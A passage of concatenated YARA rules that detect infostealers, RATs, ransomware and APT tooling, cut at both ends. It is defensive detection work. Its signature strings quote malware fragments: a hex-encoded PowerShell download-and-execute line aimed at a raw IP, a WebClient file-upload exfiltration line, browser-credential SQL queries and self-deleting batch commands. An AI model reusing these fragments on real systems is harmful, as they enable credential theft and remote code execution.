        // xor byte ptr ds:[ecx],45; inc dword ptr ss:[ebp-4]; cmp dword ptr ss:[ebp-4],5E07
        // XOR loop in first stage loader to decrypt the second stage loader
        $hx_xor_1 = { 80 31 45 FF 45 FC 81 7D FC 07 5E 00 00 }

        // ($hx_xor_3 ^ 0x45)
        // Second stage loader XOR loop pattern as it is stored in first stage loader prior to being XOR'd
        $hx_xor_2 = { c8 51 44 c6 a7 4a cf 51 7f 75 55 05 }

        // lea edx,dword ptr ds:[ecx+eax]; and edx,F; mov dl,byte ptr ds:[edx+edi]; xor byte ptr ds:[eax],dl; inc eax
        // This is ($hx_xor_2 ^ 0x45), found in the second stage loader stub after being XOR'd by the first stage loader
        $hx_xor_3 = { 8d 14 01 83 e2 0f 8a 14 3a 30 10 40 }

        // xor ecx,0x4358ad54; shr ecx,1;  dec eax
        // XOR loop found in final payload
        $hx_xor_4 = { 81 F1 54 AD 58 43 D1 E9 48 }

  condition:
    $hx_xor_4 or 2 of them
}

// Strings common to LokiBot
rule infostealer_loki {
  strings:
        $str_builder = "fuckav.ru" nocase wide ascii
        $str_cyb_fox = "%s\\8pecxstudios\\Cyberfox\\profiles.ini" wide ascii
        $str_c2 = "fre.php" wide ascii

  condition:
    any of them and infostealer_xor_patterns
}

// Strings common to Pony
rule infostealer_pony {
  strings:
        $str_softx = "Software\\SoftX.org\\FTPClient\\Sites" wide ascii
        $str_ftp_plus = "FTP++.Link\\shell\\open\\command" wide ascii
        $str_c2 = "gate.php" wide ascii

  condition:
    any of them and infostealer_xor_patterns
}
rule kleptoparasite {
 meta:
     author = "jarcher"
     hash = "2109fdb52f63a8821a7f3efcc35fa36e759fe8b57db82aa9b567254b8fb03fb1"
 
 strings:
     $str_full_pdb = "E:\\Work\\HF\\KleptoParasite Stealer 2018\\Version 3\\3 - 64 bit firefox n chrome\\x64\\Release\\Win32Project1.pdb" wide ascii nocase
     $str_part_pdb_1 = "KleptoParasite" wide ascii nocase
     $str_part_pdb_2 = "firefox n chrome" wide ascii nocase
     $str_sql= "SELECT origin_url, username_value, password_value FROM logins" wide ascii nocase
     $str_chrome_32 = "<center>Google Chrome 32bit NOT INSTALLED" wide ascii nocase
     $str_firefox_32 = "<center>FireFox 32bit NOT INSTALLED" wide ascii nocase
     $str_chrome_64 = "<center>Google Chrome 64bit NOT INSTALLED" wide ascii nocase
     $str_firefox_64 = "<center>FireFox 64bit NOT INSTALLED" wide ascii nocase
     $str_outlook_32 = "Microsoft Outlook 32 bit</b>" wide ascii nocase
     $str_outlook_64 = "Microsoft Outlook 64 bit</b>" wide ascii nocase
     $str_outlook_prof = "Outlook\\Profiles\\Outlook\\" wide ascii
     $str_obf = "naturaleftouterightfullinnercross" wide ascii nocase
     $str_c2 = "ftp.totallyanonymous.com" wide ascii nocase
     $str_fn = "fc64.exe" wide ascii nocase
     $str_ip = "myexternalip.com/raw" wide ascii
     $str_ret = "IP retriever" wide ascii
     $str_dxwrk = "DXWRK.html" wide ascii
    
 condition:
     3 of them
}
rule lockergoga {
   meta:
      author = "jeFF0Falltrades"
      hash = "bdf36127817413f625d2625d3133760af724d6ad2410bea7297ddc116abc268f"

   strings:
      $dinkum = "licensed by Dinkumware, Ltd. ALL RIGHTS RESERVED" wide ascii nocase
      $ransom_1 = "You should be thankful that the flaw was exploited by serious people and not some rookies." wide ascii nocase
      $ransom_2 = "Your files are encrypted with the strongest military algorithms RSA4096 and AES-256" wide ascii nocase
      $str_1 = "(readme-now" wide ascii nocase
      $mlcrosoft = "Mlcrosoft" wide ascii nocase
      $mutex_1 = "MX-tgytutrc" wide ascii nocase
      $cert_1 = "16 Australia Road Chickerell" wide ascii nocase
      $cert_2 = {  2E 7C 87 CC 0E 93 4A 52 FE 94 FD 1C B7 CD 34 AF } //  MIKL LIMITED
      $cert_3 = { 3D 25 80 E8 95 26 F7 85 2B 57 06 54 EF D9 A8 BF } // CCOMODO RSA Code Signing CA
      $cert_4 = {  4C AA F9 CA DB 63 6F E0 1F F7 4E D8 5B 03 86 9D } //  COMODO SECURE

   condition:
      4 of them
}
rule metamorfo_msi {
  meta:
    author = "jeFF0Falltrades"
    ref = "https://blog.trendmicro.com/trendlabs-security-intelligence/analysis-abuse-of-custom-actions-in-windows-installer-msi-to-run-malicious-javascript-vbscript-and-powershell-scripts/"
    description = "This is a simple, albeit effective rule to detect most Metamorfo initial MSI payloads"

  strings:
    $str_1 = "replace(\"pussy\", idpp)" wide ascii nocase
    $str_2 = "GAIPV+idpp+\"\\\\\"+idpp" wide ascii nocase
    $str_3 = "StrReverse(\"TEG\")" wide ascii nocase
    $str_4 = "taller 12.2.1" wide ascii nocase
    $str_5 = "$bExisteArquivoLog" wide ascii nocase
    $str_6 = "function unzip(zipfile, unzipdir)" wide ascii nocase
    $str_7 = "DonaLoad(ArquivoDown" wide ascii nocase
    $str_8 = "putt_start" wide ascii nocase
    $str_9 = "FilesInZip= zipzipp" wide ascii nocase
    $str_10 = "@ u s e r p r o f i l e @\"+ppasta" wide ascii nocase
    $str_11 = "getFolder(unzipdir).Path" wide ascii nocase

  condition:
    2 of them
}
rule micropsia_2018 {
 meta:
    author = "jeFF0Falltrades"
    hash = "4c3fecea99a469a6daf2899cefe93d9acfd28a0b6c196592da47e917c53c2c76"

 strings:
    $gen_app_id = { 53 31 DB 69 93 08 D0 68 00 05 84 08 08 42 89 93 08 D0 68 00 F7 E2 89 D0 5B C3 } // 0x4072f0 loop which generates the unique "App ID"
    $get_temp_dir = { 68 00 04 00 00 8d 44 24 04 50 8b c7 e8 [4] 8b e8 55 e8 [2] fe ff } // 0x0042C689 func retrieving %TEMP%
    $str_install_appid = "ApppID.txt" wide ascii nocase

 condition:
    2 of them
}
import "pe"

rule nanocore_rat {
    meta:
        author = "jeFF0Falltrades"
    
    strings:
        $str_nano_1 = "NanoCore.ClientPlugin" wide ascii
        $str_nano_2 = "NanoCore.ClientPluginHost" wide ascii
        $str_plg_1 = "Plugin [{0}] requires an update" wide ascii
        $str_plg_2 = "Plugin [{0}] is being uninstalled" wide ascii
        $str_conn_1 = "PrimaryConnectionHost" wide ascii
        $str_conn_2 = "BackupConnectionHost" wide ascii
        $str_id = "C8AA-4E06-9D54-CF406F661572" wide ascii
        // Loop used to load in config
        $load_config = { 02 06 9A 74 54 00 00 01 0B 02 06 17 58 9A 28 3A 00 00 0A }
    
    condition:
        2 of ($str_*) or $load_config or (pe.timestamp == 1424566177)
}

rule nanocore_surveillance_plugin {
    meta:
        author = "jeFF0Falltrades"
    
    strings:
        $str_name = "SurveillanceExClientPlugin.dll" wide ascii
        $str_keylog = "KeyboardLogging" wide ascii
        $str_dns_log = "DNSLogging" wide ascii
        $str_html_1 = "<td bgcolor=#FFFFF0 nowrap>.+?<td bgcolor=#FFFCF0 nowrap>(.+?)<td bgcolor=#FFFAF0 nowrap>(.+?)<td bgcolor=#FFF7F0 nowrap>.+?<td bgcolor=#FFF5F0 nowrap>.+?<td bgcolor=#FFF2F0 nowrap>.+?<td bgcolor=#FFF0F0 nowrap>.+?<td bgcolor=#FCF0F2 nowrap>.+?<td bgcolor=#FAF0F5 nowrap>(.+?)<td bgcolor=#F7F0F7 nowrap>" wide ascii
        $str_html_2 = "<td bgcolor=#FFFFFF nowrap>(.+?)<td bgcolor=#FFFFFF nowrap>(.+?)<td bgcolor=#FFFFFF nowrap>(.+?)<td bgcolor=#FFFFFF nowrap>(.+?)<td bgcolor=#FFFFFF nowrap>" wide ascii
        $str_html_3 = "/shtml \"{0}\"" wide ascii
        $str_rsrc_lzma = "Lzma" wide ascii
        $str_nano = "NanoCore.ClientPlugin" wide ascii
        $str_pass_tool = "ExecutePasswordTool" wide ascii
        $get_raw_input = { 20 03 00 00 10 12 02 12 04 02 7B 09 00 00 04 28 C8 00 00 06 } // GetRawInputData Loop
        $get_dns_cache = { 12 02 7B 62 00 00 04 7E 7F 00 00 0A 28 80 00 00 0A 2C B5 }   // GetDNSCacheDataTable Loop    
    
    condition:
        (all of ($get_*)) or (3 of ($str_*)) or (pe.timestamp == 1424566189)
}
rule netwire {
  meta:
    author = "jeFF0Falltrades"
    hash = "80214c506a6c1fd8b8cd2cd80f8abddf6b771a4b5808a06636b6264338945a7d"

  strings:
    $ping = "ping 192.0.2.2 -n 1 -w %d >nul 2>&1" wide ascii nocase
    $bat_1 = "DEL /s \"%s\" >nul 2>&1" wide ascii nocase
    $bat_2 = "call :deleteSelf&exit /b" wide ascii nocase
    $bat_3 = "start /b \"\" cmd /c del \"%%~f0\"&exit /b" wide ascii nocase
    $ua = "User-Agent: Mozilla/4.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko" wide ascii nocase
    $log = "[Log Started]" wide ascii nocase
    $xor = { 0F B6 00 83 F0 ?? 83 C0 ?? 88 02 } // movzx eax, byte ptr [eax]; xor eax, ??; add  eax, ??;  mov [edx], al (XOR encryption of log data)

  condition:
    4 of them
}
rule parallax_rat_2020 {
  meta:
    author = "jeFF0Falltrades"
    
  strings:
    $str_ws = ".DeleteFile(Wscript.ScriptFullName)" wide ascii
    $str_cb_1 = "Clipboard Start" wide ascii
    $str_cb_2 = "Clipboard End" wide ascii
    $str_un = "UN.vbs" wide ascii
    $hex_keylogger = { 64 24 ?? C0 CA FA }

  condition:
    3 of them
}
rule poshc2_apt_33_2019 {
    meta:
        author = "jeFF0Falltrades"
        desc = "Alerts on PoshC2 payloads which align with 2019 APT33 reporting (this will not fire on all PoshC2 payloads)"
        ref = "http://www.rewterz.com/rewterz-news/rewterz-threat-alert-iranian-apt-uses-job-scams-to-lure-targets"
    
    strings:
        $js_date = /\[datetime\]::ParseExact\("[0-9]+\/[0-9]+\/[0-9]+","dd\/MM\/yyyy",\$null/
        $js_crypt = "System.Security.Cryptography" wide ascii
        $js_host = "Headers.Add(\"Host" wide ascii
        $js_proxy = "$proxyurl = " wide ascii
        $js_arch = "$env:PROCESSOR_ARCHITECTURE" wide ascii
        $js_admin = "[System.Security.Principal.WindowsBuiltInRole]::Administrator" wide ascii
        $hta_unescape = "%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%27%3c%73%63%72%69%70%74%20%74%79%70%65%3d%22%74%65%78%74%2f%76%62%73%63%72%69%70%74%22%3e%5c%6e%53%75%62%20%41%75%74%6f%4f%70%65%6e%28%29" wide ascii
        $hta_hex = "202f7720312049455820284e65772d4f626a656374204e65742e576562436c69656e74292e446f776e6c6f6164537472696e672827687474703a2f2f352e3235322e3137382e32302f7261797468656f6e322d6a6f62732e6a706727293b" wide ascii
        $hta_powershell = "706f7765727368656c6c2e657865" wide ascii

    condition:
        4 of ($js_*) or 2 of ($hta_*)
}
rule apt_33_powerton {
    meta:
        author = "jeFF0Falltrades"
        hash = "6bea9a7c9ded41afbebb72a11a1868345026d8e46d08b89577f30b50f4929e85"

    strings:
        $str_wmi = "Adding wmi persist ..." wide ascii
        $str_registery = "Poster \"Registery Value With Name" wide ascii
        $str_upload = "(New-Object Net.WebClient).UploadFile(\"$SRVURL$address\", \"$fullFilePath" wide ascii
        $str_pass = "jILHk{Yu1}2i0h^xe|t,d+Cy:KBv!l?7" wide ascii
        $str_addr = "$address=\"/contact/$BID$($global:rndPost)/confirm" wide ascii
        $str_png = "$env:temp + \"\\\" + $(date -format dd-m-y-HH-mm-s) + \".png" wide ascii
        $str_msg = "/contact/msg/$BID$($global:rndPost)" wide ascii
        $str_ua = "Mozilla/5.0 (Windows NT $osVer; rv:38.0) Gecko/20100101 Thunderbird/38.1.0 Lightning/4.0.2" wide ascii
        $domain = "backupaccount.net" wide ascii

    condition:
        2 of ($str*) or $domain
}rule redline_dropper {
	meta:
		author = "jeFF0Falltrades"
		hash = "6d477b08a0b9c1e8db4ecb921d07b124973f5213639d88fff7df5146adcefc79"
		description = "This rule matches droppers that appear to be related to samples of RedLine Stealer or a derivation (as of APR2021)"

	strings:
		$str_0 = "RayCastingCSHARP.Properties.Resources.resources" wide ascii
		$str_1 = "VOICEPHILIN" wide ascii
		$str_2 = "TRUECITY" wide ascii
		$str_3 = "Ronald RayGun" wide ascii
		$str_4 = "MR POLICE" wide ascii
		$hex_0 = { 06 12 09 28 ?? 00 00 0A 6F ?? 00 00 0A 06 12 09 28 ?? 00 00 0A 6F ?? 00 00 0A 06 12 09 28 ?? 00 00 0A 6F ?? 00 00 0A }

	condition:
		2 of them
}

rule redline_stealer {
	meta:
		author = "jeFF0Falltrades"
		hash = "f64ed3bd7304cdec6e99bb35662aa485e32156c1ca7275fed0c1e67d2f9fc139"
		description = "This rule matches unpacked RedLine Stealer samples and derivatives (as of APR2021)"

	strings:
		$str_0 = "Software\\Valve\\SteamLogin Data" wide ascii
		$str_1 = "name_on_cardencrypted_value" wide ascii
		$str_2 = "card_number_encrypted" wide ascii
		$str_3 = "geoplugin_region!" wide ascii
		$str_4 = "set_GameChatFiles" wide ascii
		$str_5 = "set_ScanDiscord" wide ascii
		$str_6 = "<GameChatFiles>k__BackingField" wide ascii

	condition:
		3 of them
}
import "pe"

rule remcos_rat {
 meta:
     author = "jeFF0Falltrades"
 
 strings:
     $str_upload = "Uploading file to C&C" wide ascii
     $str_keylog_1 = "Offline Keylogger Started" wide ascii
     $str_keylog_2 = "Online Keylogger Started" wide ascii
     $str_mutex_1 = "Mutex_RemWatchdog" wide ascii
     $str_mutex_2 = "Remcos_Mutex_Inj" wide ascii
     $str_cleared = "Cleared all cookies & stored logins!" wide ascii
     $str_bs_vendor = "Breaking-Security.Net" wide ascii
     $str_controller = "Connecting to Controller..." wide ascii
     $str_rc4 = { 40 8b cb 99 f7 f9 8b 84 95 f8 fb ff ff 8b f3 03 45 fc 89 55 f8 8d 8c 95 f8 fb ff ff 99 f7 fe 8a 01 8b f2 8b 94 b5 f8 fb ff ff } // RC4 PRGA

 condition:
     3 of ($str*) or (pe.sections[0].name == "VVR" and pe.sections[1].name == "ZKZR" and pe.sections[2].name == ".test" and pe.sections[3].name == "rca" and pe.sections[4].name == "vga")
}

rule zip_img_stego {
  meta:
    author = "jeFF0Falltrades"
    description = "This rule attempts to identify ZIP (and JAR, APK, DOCX, etc.) archives embedded within various image filetypes."

  strings:
    $img_gif = { 47 49 46 38 }
    $img_jpeg_1 = { FF D8 FF DB } // explicitly break out JPEG variations to avoid triggering a "slowing down scanning" condition
    $img_jpeg_2 = { FF D8 FF E0 }
    $img_jpeg_3 = { FF D8 FF EE }
    $img_jpeg_4 = { FF D8 FF E1 }
    $img_png = { 89 50 4E 47 0D 0A 1A 0A }
    $zip_header = { 50 4B 03 04 }
    $zip_footer = { 50 4B 05 06 00 }

  condition:
    /* The final portion of this condition looks for the ZIP archive footer within 25 bytes
    of the end of the file - This can be omitted or adjusted for your use case, but appears 
    to work for several waves of infostealers seen at the time of writing. */
    (for any of ($img*): ($ at 0)) and (all of ($zip*)) and ($zip_footer in (filesize-25..filesize))
}

rule zip_iso_stego {
  meta:
    author = "jeFF0Falltrades"
    description = "This rule identifies a specific phishing technique of sending ISO file attachments containing ZIP (and JAR, APK, DOCX, etc.) archives which in turn contain malicious executables."

  strings:
    $iso_header = { 43 44 30 30 31 } // CD001
    $exe_zip = { 2e 65 78 65 50 4b 05 06 00 00 00 00 01 00 01 } // .exePK signature

  condition:
    (($iso_header at 0x8001) or ($iso_header at 0x8801) or ($iso_header at 0x9001)) and $exe_zip
}

rule lokibot_img_stego {
  meta:
    author = "jeFF0Falltrades"
    description = "This rule identifies a specific variant of LokiBot which uses image steganography to obscure an encrypted payload; See reference."
    reference = "https://blog.trendmicro.com/trendlabs-security-intelligence/lokibot-gains-new-persistence-mechanism-uses-steganography-to-hide-its-tracks/"

  strings:
    $img_gif = { 47 49 46 38 }
    $img_jpeg_1 = { FF D8 FF DB } // explicitly break out JPEG variations to avoid triggering a "slowing down scanning" condition
    $img_jpeg_2 = { FF D8 FF E0 }
    $img_jpeg_3 = { FF D8 FF EE }
    $img_jpeg_4 = { FF D8 FF E1 }
    $img_png = { 89 50 4E 47 0D 0A 1A 0A }
    $loki_enc_header = { 23 24 25 5e 26 2a 28 29 5f 5f 23 40 24 23 35 37 24 23 21 40 }

  condition:
    (for any of ($img*): ($ at 0)) and $loki_enc_header
}rule ursnif_zip_2019 {
  meta:
    author = "jeFF0Falltrades"
    reference = "https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html"

  strings:
    $doc_name = { 69 6e 66 6f 5f ?? ?? 2e ?? ?? 2e 64 6f 63 } // info_MM.DD.doc
    $zip_header = { 50 4B 03 04 }
    $zip_footer = { 50 4B 05 06 00 }

  condition:
    ($zip_header at 0) and ($doc_name in (0..48)) and ($zip_footer in (filesize-150..filesize))
}

rule ursnif_dropper_doc_2019 {
  meta:
    author = "jeFF0Falltrades"
    reference = "https://www.fortinet.com/blog/threat-research/ursnif-variant-spreading-word-document.html"

  strings:
    $sleep = "WScript.Sleep(56000)" wide ascii nocase
    $js = ".js" wide ascii
    $ret = { 72 65 74 75 72 6e 20 22 52 75 22 20 2b 20 22 5c 78 36 65 22 } // return "Ru" + "\x6e"
    $pse = { 70 6f 77 65 72 73 68 65 6c 6c 20 2d 45 6e 63 20 } //powershell -Enc

  condition:
    uint16(0) == 0xcfd0 and all of them
}rule wsh_rat_vbs_decoded
{
	meta:
		author = "jeFF0Falltrades"
		ref = "https://cofense.com/houdini-worm-transformed-new-phishing-attack"
		description = "Alerts on the decoded WSH RAT VBScript"

	strings:
		$str_0 = "wshsdk" wide ascii nocase
		$str_1 = "wshlogs" wide ascii nocase
		$str_2 = "WSHRAT" wide ascii nocase
		$str_3 = "WSH Sdk for password recovery" wide ascii nocase
		$str_4 = "wshlogs\\recovered_password_email.log" wide ascii nocase
		$str_5 = "post (\"is-ready\",\"\")" wide ascii nocase
		$str_6 = "split (response,spliter)" wide ascii nocase
		$str_7 = "updatestatus(\"SDK+Already+Installed\")" wide ascii nocase
		$str_8 = "case \"get-pass-offline\"" wide ascii nocase
		$str_9 = "case \"up-n-exec\"" wide ascii nocase
		$str_10 = "Unable to automatically recover password" wide ascii nocase
		$str_11 = "reverseproxy" wide ascii nocase
		$str_12 = "keyloggerstarter" wide ascii nocase

	condition:
		3 of ($str*)
}

rule wsh_rat_keylogger
{
	meta:
		author = "jeFF0Falltrades"
		ref = "https://cofense.com/houdini-worm-transformed-new-phishing-attack"
		description = "Alerts on the WSH RAT .NET keylogger module"


	strings:
		$str_0 = "Keylogger" wide ascii nocase
		$str_1 = "RunKeyloggerOffline" wide ascii nocase
		$str_2 = "saveKeyLog" wide ascii nocase
		$str_3 = "sendKeyLog" wide ascii nocase
		$str_4 = "/open-keylogger" wide ascii nocase
		$str_5 = "wshlogs" wide ascii nocase
		$str_6 = "WSHRat Plugin" wide ascii nocase
		$str_7 = "Debug\\Keylogger.pdb" wide ascii nocase

	condition:
		3 of them
}

rule wsh_rat_rdp
{
	meta:
		author = "jeFF0Falltrades"
		ref = "https://cofense.com/houdini-worm-transformed-new-phishing-attack"
		description = "Alerts on the WSH RAT .NET RDP module"

	strings:
		$str_0 = "GET /open-rdp|" wide ascii nocase
		$str_1 = "WSHRat Plugin" wide ascii nocase
		$str_2 = "Debug\\RDP.pdb" wide ascii nocase
		$str_3 = "TakeShoot" wide ascii nocase
		$str_4 = "CompressJPEG" wide ascii nocase

	condition:
		3 of them
}


rule wsh_rat_reverse_proxy
{
	meta:
		author = "jeFF0Falltrades"
		ref = "https://cofense.com/houdini-worm-transformed-new-phishing-attack"
		description = "Alerts on the WSH RAT .NET reverse proxy module"

	strings:
		$str_0 = "RProxy:" wide ascii nocase
		$str_1 = "WSH Inc" wide ascii nocase
		$str_2 = "WSH Reverse Proxy" wide ascii nocase
		$str_3 = "Debug\\ReverseProxy.pdb" wide ascii nocase
		$str_4 = "WshRP" wide ascii nocase
		$str_5 = "NotifyBringNewSocket" wide ascii nocase

	condition:
		3 of them
}
rule detect_apt_APT29: APT29
{
	meta:
	    description = "detect_APT32_malware"
	    author = "@malgamy12"
            date = "2022-11-6"
	    license = "DRL 1.1"
	    hash_sample1 = "93054d3abc36019ccfe88f87363363e6ca9b77f4"
            hash_sample2 = "0eadbd6ef9f5930257530ac5a3b8abb49c9755d1"
            hash_sample3 = "69c2d292179dc615bfe4d7f880b5f9928604558e"
            hash_sample4 = "616306489de4029da7271eadbdf090cee22ae1af"
            hash_sample5 = "ecb8edfddd812a125b515dc42a2e93569c1caed9"
            hash_sample6 = "a86f3faf1eedb7325023616adf37a62c9129c24e"
            hash_sample7 = "4d22b2d85b75ccf651f0ba85808482660a440bff"
            hash_sample8 = "3463df6b33b26c1249207f6e004c0bbc31b31152"
            hash_sample9 = "ca4c53eb86d5b920b321de573e212e31405707d5"
            hash_sample10 = "a48e4dd017618ae2d46a753345594a5f57fbe869"

    strings:
        $pdb = "5\\bin\\bot.pdb" ascii

        $s1 = "pipe\\40DC244D-F62E-093E-8A91-736FF2FA2AA2" wide
        $s2 = "LoginName" ascii	
        $s3 = "select id, hostname, usernamefield, passwordfield, encryptedusern" wide
        $s4 = "*temporary;*Cookies;*games;*system32;*program files;*\\windows\\;*\\System Volume Information" wide
        $s5 = "msicheck.cmd" ascii
        $s6 = "AppData\\Roaming\\Miranda"  wide 
        $s7 = "Local Settings\\Application Data" wide
	
	/*
	imul    ebx, esi
        imul    esi, 0BC8Fh
        mov     eax, edx
        and     eax, 3
        lea     eax, [ebp+eax*4+var_3C]
        xor     [eax], ebx
        inc     edx
        dec     [ebp+var_8]
	*/

        $chunk_1 = {0F AF DE 69 F6 ?? ?? ?? ?? 8B C2 83 E0 ?? 8D 44 85 ?? 31 18 42 FF 4D ??}   

    condition:
        uint16(0) == 0x5A4D and filesize > 70KB and ($pdb  or  (4 of ($s*) and $chunk_1 ))
}








rule detect_catB: ransomware
{
    meta:
	description = "detect_CatB_ransomware"
	author = "@malgamy12"
	date = "2023/1/4"
        hash = "35a273df61f4506cdb286ecc40415efaa5797379b16d44c240e3ca44714f945b"
        

    strings:
        $op1 = {C1 C0 ?? 44 8B C0 8B C8 41 8B D0 48 C1 E9 ?? 83 E1 ?? 48 C1 E8 ?? 48 C1 E1 ?? 83 E0 ?? 48 03 C8 48 C1 EA ?? 83 E2 ?? 48 C1 E2 ?? 42 0F B6 04 19 41 8B C8 48 C1 E9 ?? 83 E1 ?? C1 E0 ?? 48 03 D1 42 0F B6 0C 1A 41 8B D0 C1 E1 ?? 03 C1 48 C1 EA ?? 41 8B C8 48 C1 E2 ?? 48 C1 E9 ?? 83 E1 ?? 48 03 D1 42 0F B6 0C 1A C1 E1 ?? 03 C1 41 8B C8 48 C1 E9 ?? 41 83 E0 ?? 83 E1 ?? 48 C1 E1 ?? 49 03 C8 42 0F B6 0C 19 03 C1}
        $op2 = {44 0F B6 59 ?? 48 8D 3D ?? ?? ?? ?? 44 0F B6 09 48 8B D9 44 0F B6 51 ?? 44 0F B6 41 ?? 4B 8D 14 5B 0F B6 4C 57 ?? 4B 8D 04 49 32 0C 47 4B 8D 04 5B 41 32 C8 41 32 CA 88 0B 4B 8D 0C} 
        $op3 = {52 0F B6 54 4F ?? 4B 8D 0C 40 32 14 47 4B 8D 04 52 41 32 D0 41 32 D1 88 53 ?? 0F B6 54 4F ?? 4B 8D 0C 40 32 14 47 4B 8D 04 49 44 0F B6 43 ?? 41 32 D3 41 32 D1 44 0F B6 4B ?? 88 53 ?? 0F B6 14 4F 32 54 47 ?? 41 32 D3 4B 8D 04 49 44 0F B6 5B ?? 41 32 D2 44 0F B6 53 ?? 88 53 ?? 4B 8D 0C 5B 0F B6 54 4F ?? 4B 8D 0C 52 32 14 47 4B 8D 04 5B 41 32 D0 41 32 D2 88 53 ?? 0F B6 54 4F ?? 4B 8D 0C 40 32 14 47 4B 8D 04 52 41 32 D0 41 32 D1 88 53 ?? 0F B6 54 4F ?? 4B 8D 0C 40 32 14 47 4B 8D 04 49 44 0F B6 43 ?? 41 32 D3 41 32 D1 44 0F B6 4B ?? 88 53 ?? 0F B6 14 4F 32 54 47 ?? 41 32 D3 4B 8D 04 49 44 0F B6 5B ?? 41 32 D2 44 0F B6 53 ?? 88 53 ?? 4B 8D 0C 5B 0F B6 54 4F ?? 4B 8D 0C 52 32 14 47 4B 8D 04 5B 41 32 D0 41 32 D2 88 53 ?? 0F B6 54 4F ?? 32 14 47 41 32 D0 4B 8D 0C 40 41 32 D1 4B 8D 04 52 88 53 ?? 0F B6 54 4F ?? 4B 8D 0C 40 32 14 47 4B 8D 04 49 44 0F B6 43 ?? 41 32 D3 41 32 D1 44 0F B6 4B ?? 88 53 ?? 0F B6 14 4F 32 54 47 ?? 41 32 D3 4B 8D 04 49 44 0F B6 5B ?? 41 32 D2 44 0F B6 53 ?? 88 53 ?? 4B 8D 0C 5B 0F B6 54 4F ?? 4B 8D 0C 52 32 14 47 4B 8D 04 5B 41 32 D0 41 32 D2 88 53 ?? 0F B6 54 4F ?? 4B 8D 0C 40 32 14 47 4B 8D 04 52 41 32 D0 41 32 D1 88 53 ?? 0F B6 54 4F ?? 4B 8D 0C 40 32 14 47 4B 8D 04 49 41 32 D3 41 32 D1 88 53 ?? 0F B6 14 4F 32 54 47 ?? 48 8B 7C 24 ?? 41 32 D3 41 32 D2 88 53 ?? 48 8B 5C 24}

    condition:
        uint16(0) == 0x5A4D and all of them
}



rule colibri_loader: colibri
{
    meta:
	description = "Detect_colibri_loader"
	author = "@malgamy12"
	date = "7/12/2022"
	license = "DRL 1.1"
        hash= "59f5e517dc05a83d35f11c6682934497"
        hash= "7615231dd8463c48f9dc66b67da68f49"
        hash= "7f697936757ced404c2a7515ccfe426b"
        hash= "85c3a80b85fceae0aba419b8b62ff831"
        hash= "f1bbf3a0c6c52953803e5804f4e37b15"
        hash= "7207e37226711374827d0f877b607b0f"
        hash= "7eb0b86bc4725d56c499939ab06212cf"
        hash= "21ec2cac8a3511f6a3d1ade20d5c1e38"
                
    strings:
        $p1 = {0F B7 06 0F B7 4E ?? 03 D0 8B C2 83 C6 ?? C1 E0 ?? 33 C8 C1 E1 ?? 33 D1 8B C2 C1 E8 ?? 03 D0 83 EB}
        $p2 = {8B C2 C1 E0 ?? 33 D0 8B C2 C1 E8 ?? 03 D0 8B C2 C1 E0 ?? 33 D0 8B C2 C1 E8 ?? 03 D0 8B C2 C1 E0 ?? 33 D0 8B C2 C1 E8 ?? 03 C2}
        $p3 = {33 D2 8B C3 F7 75 ?? 66 8B 04 56 66 33 04 0F 43 66 89 01 8D 49 ?? 3B 5D}
        
    condition:
        uint16(0) == 0x5A4D and all of them
}
rule Cova_malware: Cova
{
    meta:
	description = "Detect_Cova_malware"
	author = "@malgamy12"
	date = "2023/1/9"
        license = "DRL 1.1"
        hash = "a1ae4a7440c7f2f0d03c6f2e05ff97b875e8295cf2b340b96fdda919af6c7eb5"

  
                
    strings:
	    
        $s1 = "Release\\orval.pdb" ascii 

        $op1 = {49 8B C0 83 E0 ?? 8A 0C 04 43 32 0C 01 41 32 C8 43 88 0C 01 49 FF C0 4C 3B C2 72}
        
        
    condition:
        uint16(0) == 0x5A4D and all of them
}



rule cuba_ransomware: cuba
{
    meta:
	description = "Detect_cuba_ransomware"
	author = "@malgamy12"
	date = "24/11/2022"
	license = "DRL 1.1"
        hash = "c2aad237b3f4c5a55df88ef26c25899fc4ec8170"
        hash = "4b41a1508f0f519396b7c14df161954f1c819e86"
        hash = "d5fe48b914c83711fe5313a4aaf1e8d80533543d"
        hash = "159b566e62dcec608a3991100d6edbca781d48c0"
        hash = "e1cae0d2a320a2756ae1ee5d37bfe803b39853fa"
        hash = "6f1d355b95546f0a5a09f7fd0b85fc9658e87813"
        hash = "25da0849207beb5695c8d9826b585b8cda435eba"
        hash = "3997d19f38ce14b7643c1ad8d6a737990b444215"
        hash = "f008e568c313b6f41406658a77313f89df07017e"
        hash = "7e42b668fd2ca96b05f39d5097943a191f1010f4"
        

    strings:
        $p1 = {C1 8D 73 ?? 99 83 E2 ?? 03 C2 C1 F8 ?? 8D 04 45 [4] 89 83 [4] 0F B6 0F 0F B6 47 ?? C1 E1 ?? 0B C8 0F B6 47 ?? C1 E1 ?? 0B C8 0F B6 47 ?? C1 E1 ?? 0B C8 89 0B 0F B6 47 ?? 89 4D ?? 0F B6 4F ?? C1 E1 ?? 0B C8 0F B6 47 ?? C1 E1 ?? 0B C8 0F B6 47 ?? C1 E1 ?? 0B C8 89 0E 0F B6 4F ?? 0F B6 47 ?? C1 E1 ?? 0B C8 0F B6 47 ?? C1 E1 ?? 0B C8 0F B6 47 ?? C1 E1 ?? 0B C8 89 4B ?? 0F B6 4F ?? 0F B6 47 ?? C1 E1 ?? 0B C8 0F B6 47 ?? C1 E1 ?? 0B C8 0F B6 47 ?? C1 E1 ?? 0B C8 8B 45 ?? 89 4D ?? 89 4B}
        $p2 = {5D ?? 8B C3 C1 E8 ?? 0F B6 D0 8B C3 C1 E8 ?? 0F B6 C8 8B 04 95 [4] 33 04 8D [4] 8B CB C1 E9 ?? 33 04 8D [4] 0F B6 CB 5B 33 04 8D}
